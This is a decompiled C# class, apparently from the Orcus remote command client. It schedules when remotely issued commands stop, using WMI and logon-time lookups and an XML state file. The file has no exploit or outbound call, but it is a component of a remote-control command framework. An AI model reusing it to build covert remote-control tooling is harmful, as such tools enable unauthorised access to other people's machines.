using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading;
using System.Xml.Serialization;
using Orcus.Config;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;

namespace Orcus.StaticCommandManagement;

public class ActiveCommandStopScheduler
{
	private DynamicCommandStore _dynamicCommandStore;

	private DateTime? _upTime;

	private StopSchedulerSettings _stopSchedulerSettings;

	private string _settingsFilename = "schedulerInfo.xml";

	private readonly object _settingsLock = new object();

	public DateTime StartupTime
	{
		get
		{
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0063: Expected O, but got Unknown
			if (!_upTime.HasValue)
			{
				_upTime = GetLogonDateTime();
				if (!_upTime.HasValue)
				{
					UserPrincipal current = UserPrincipal.get_Current();
					try
					{
						_upTime = ((AuthenticablePrincipal)current).get_LastLogon();
					}
					finally
					{
						((IDisposable)current)?.Dispose();
					}
				}
				if (!_upTime.HasValue)
				{
					PerformanceCounter val = new PerformanceCounter("System", "System Up Time");
					try
					{
						val.NextValue();
						_upTime = DateTime.Now - TimeSpan.FromSeconds(val.NextValue());
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
			}
			return _upTime.GetValueOrDefault();
		}
	}

	private static DateTime? GetLogonDateTime()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_LogonSession");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						try
						{
							return ManagementDateTimeConverter.ToDateTime((string)((ManagementBaseObject)val2).get_Item("StartTime"));
						}
						catch (Exception)
						{
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static DateTime? GetLastLogin()
	{
		UserPrincipal current = UserPrincipal.get_Current();
		try
		{
			return ((AuthenticablePrincipal)current).get_LastLogon();
		}
		finally
		{
			((IDisposable)current)?.Dispose();
		}
	}

	public void Initialize(DynamicCommandStore dynamicCommandStore)
	{
		_dynamicCommandStore = dynamicCommandStore;
		FileInfo fileInfo = new FileInfo(Path.Combine(Consts.PotentialCommandsDirectory, _settingsFilename));
		if (fileInfo.Exists)
		{
			XmlSerializer xmlSerializer = new XmlSerializer(typeof(StopSchedulerSettings));
			try
			{
				using FileStream stream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
				_stopSchedulerSettings = (StopSchedulerSettings)xmlSerializer.Deserialize(stream);
			}
			catch (Exception)
			{
				File.Delete(fileInfo.FullName);
				_stopSchedulerSettings = new StopSchedulerSettings();
			}
			lock (dynamicCommandStore.ListLock)
			{
				for (int num = _stopSchedulerSettings.Sessions.Count - 1; num >= 0; num--)
				{
					SessionCommandInfo sessionInfo = _stopSchedulerSettings.Sessions[num];
					if (dynamicCommandStore.StoredCommands.All((PotentialCommand x) => x.get_CallbackId() != sessionInfo.CommandId))
					{
						_stopSchedulerSettings.Sessions.Remove(sessionInfo);
					}
				}
				for (int num2 = _stopSchedulerSettings.DurationStopEventInfos.Count - 1; num2 >= 0; num2--)
				{
					DurationStopEventInfo durationStopEventInfo = _stopSchedulerSettings.DurationStopEventInfos[num2];
					if (dynamicCommandStore.StoredCommands.All((PotentialCommand x) => x.get_CallbackId() != durationStopEventInfo.CommandId))
					{
						_stopSchedulerSettings.DurationStopEventInfos.Remove(durationStopEventInfo);
					}
				}
			}
		}
		else
		{
			_stopSchedulerSettings = new StopSchedulerSettings();
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.PotentialCommandsDirectory);
		if (!directoryInfo.Exists)
		{
			return;
		}
		FileInfo[] files = directoryInfo.GetFiles("*.new");
		foreach (FileInfo fileInfo2 in files)
		{
			try
			{
				fileInfo2.Delete();
			}
			catch (Exception)
			{
			}
		}
	}

	public void CommandManualStop(PotentialCommand potentialCommand)
	{
		lock (_settingsLock)
		{
			SessionCommandInfo sessionCommandInfo = _stopSchedulerSettings.Sessions.FirstOrDefault((SessionCommandInfo x) => x.CommandId == potentialCommand.get_CallbackId());
			if (sessionCommandInfo != null)
			{
				_stopSchedulerSettings.Sessions.Remove(sessionCommandInfo);
				SaveSchedulerSettings();
			}
		}
	}

	public void SaveSchedulerSettings()
	{
		FileInfo fileInfo = new FileInfo(Path.Combine(Consts.PotentialCommandsDirectory, _settingsFilename));
		string text = fileInfo.FullName + ".new";
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(StopSchedulerSettings));
		fileInfo.Directory!.Create();
		try
		{
			using FileStream stream = new FileStream(text, FileMode.Create, FileAccess.Write);
			xmlSerializer.Serialize(stream, _stopSchedulerSettings);
		}
		catch (Exception)
		{
			File.Delete(text);
			return;
		}
		File.Delete(fileInfo.FullName);
		File.Move(text, fileInfo.FullName);
	}

	public bool ExecuteActiveCommand(PotentialCommand potentialCommand, ActiveStaticCommand activeStaticCommand)
	{
		if (potentialCommand.get_StopEvent() == null)
		{
			return true;
		}
		lock (_settingsLock)
		{
			switch (potentialCommand.get_StopEvent().get_Id())
			{
			default:
				return true;
			case 1u:
			{
				SessionCommandInfo sessionCommandInfo = _stopSchedulerSettings.Sessions.FirstOrDefault((SessionCommandInfo x) => x.CommandId == potentialCommand.get_CallbackId());
				DurationStopEventInfo durationStopEventInfo = _stopSchedulerSettings.DurationStopEventInfos.FirstOrDefault((DurationStopEventInfo x) => x.CommandId == potentialCommand.get_CallbackId());
				TimeSpan timeSpan2 = TimeSpan.FromTicks(BitConverter.ToInt64(potentialCommand.get_StopEvent().get_Parameter(), 0));
				if (sessionCommandInfo != null)
				{
					if (Math.Abs((StartupTime - sessionCommandInfo.StartupTime).TotalSeconds) > 60.0)
					{
						_stopSchedulerSettings.Sessions.Remove(sessionCommandInfo);
						if (durationStopEventInfo != null)
						{
							_stopSchedulerSettings.DurationStopEventInfos.Remove(durationStopEventInfo);
						}
						SaveSchedulerSettings();
						_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
						return false;
					}
					if (durationStopEventInfo != null)
					{
						_stopSchedulerSettings.DurationStopEventInfos.Remove(durationStopEventInfo);
						timeSpan2 = DateTime.Now - durationStopEventInfo.StartTime;
						if (timeSpan2 < TimeSpan.Zero)
						{
							_stopSchedulerSettings.Sessions.Remove(sessionCommandInfo);
							SaveSchedulerSettings();
							_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
							return false;
						}
					}
				}
				else
				{
					_stopSchedulerSettings.Sessions.Add(new SessionCommandInfo
					{
						CommandId = potentialCommand.get_CallbackId(),
						StartupTime = StartupTime
					});
				}
				_stopSchedulerSettings.DurationStopEventInfos.Add(new DurationStopEventInfo
				{
					CommandId = potentialCommand.get_CallbackId(),
					StartTime = DateTime.Now
				});
				SaveSchedulerSettings();
				new Timer(StopCommandCallback, activeStaticCommand, timeSpan2, TimeSpan.FromMilliseconds(-1.0));
				return true;
			}
			case 2u:
			{
				TimeSpan timeSpan = DateTime.FromBinary(BitConverter.ToInt64(potentialCommand.get_StopEvent().get_Parameter(), 0)) - DateTime.UtcNow;
				if (timeSpan < TimeSpan.Zero)
				{
					_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
					return false;
				}
				new Timer(StopAndRemoveCommandCallback, new KeyValuePair<PotentialCommand, ActiveStaticCommand>(potentialCommand, activeStaticCommand), timeSpan, TimeSpan.FromMilliseconds(-1.0));
				break;
			}
			case 3u:
			{
				SessionCommandInfo sessionCommandInfo = _stopSchedulerSettings.Sessions.FirstOrDefault((SessionCommandInfo x) => x.CommandId == potentialCommand.get_CallbackId());
				if (sessionCommandInfo != null)
				{
					if (Math.Abs((StartupTime - sessionCommandInfo.StartupTime).TotalSeconds) > 60.0)
					{
						_stopSchedulerSettings.Sessions.Remove(sessionCommandInfo);
						SaveSchedulerSettings();
						_dynamicCommandStore.RemoveStoredCommand(potentialCommand);
						return false;
					}
				}
				else
				{
					_stopSchedulerSettings.Sessions.Add(new SessionCommandInfo
					{
						CommandId = potentialCommand.get_CallbackId(),
						StartupTime = StartupTime
					});
					SaveSchedulerSettings();
				}
				return true;
			}
			}
		}
		return true;
	}

	private void StopAndRemoveCommandCallback(object state)
	{
		KeyValuePair<PotentialCommand, ActiveStaticCommand> keyValuePair = (KeyValuePair<PotentialCommand, ActiveStaticCommand>)state;
		_dynamicCommandStore.RemoveStoredCommand(keyValuePair.Key);
		keyValuePair.Value.StopExecute();
	}

	private void StopCommandCallback(object state)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		((ActiveStaticCommand)state).StopExecute();
	}
}
